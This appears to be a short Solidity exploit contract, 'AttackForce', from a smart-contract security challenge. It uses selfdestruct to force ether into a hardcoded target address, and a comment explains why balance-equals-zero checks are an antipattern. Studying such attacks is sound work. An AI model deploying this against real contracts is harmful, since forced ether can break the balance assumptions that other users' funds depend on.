// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

contract AttackForce {
    address constant ADDRESS = 0xBAD15066aF12d527682FE79c339b9B166B1438F9;

    function transfer() external payable returns (bool){
        (bool succ,) = address(this).call{value: msg.value}("");
        return succ;
    }
    function stop() external {
        selfdestruct(payable(ADDRESS));
    }
}

// Using a check such that address(this).balance == 0 for any internal logic is an antipattern due to external contracts always being able to transfer funds via selfdestruct code